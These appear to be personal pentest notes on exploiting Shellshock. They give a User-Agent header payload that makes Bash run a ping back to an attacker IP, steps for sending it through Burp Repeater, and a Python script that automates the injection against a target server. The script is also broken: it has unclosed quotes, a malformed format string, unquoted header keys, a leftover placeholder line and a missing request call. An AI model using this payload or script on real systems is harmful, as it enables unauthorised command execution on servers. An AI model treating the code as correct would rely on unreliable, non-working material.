shell shock vuln

To test for this we:
1. send a request to burp repeater
2. create payload >   () { :; }; /bin/bash -c 'ping -c 1 10.10.10.120'
3. put payload first thing inside User-Agent.
4. We get a response that it works.

WE WILL AUTOMATE THIS PROCESS IN PYTHON

1. Copy Vulnerable request to curl command
2. go to curlconverter.com > copy python curl
3. paste python curl inside code
4. edit code

import requests
import sys

try:
    target_ip = sys.argv[1]
    attack_ip = sys.argv[2]
except IndexError:
    print("[-] Usage: %s <Target IP> <Attack IP> % sys.argv[0])
    sys.exit()

payload = "() { :; }; /bin/bash -c 'ping -c 1 %'" % attack_ip
headers = {
    HOST: target_ip,
    USER-AGENT: payload,

    CURL COMMAND PYTHON CODE

    REFERER: 'http://%s/' % target_ip

}

response = 'http://%s/' % target_ip, headers=headers, verify=False)



if response.status_code == 200:
    res = response.text
    if "received" in res:
        print("[+] The target [%s]  is vulnerable to shellshock vulnerability" % target_ip)
    else:
        print("[-] Not sure if shellshock exists")

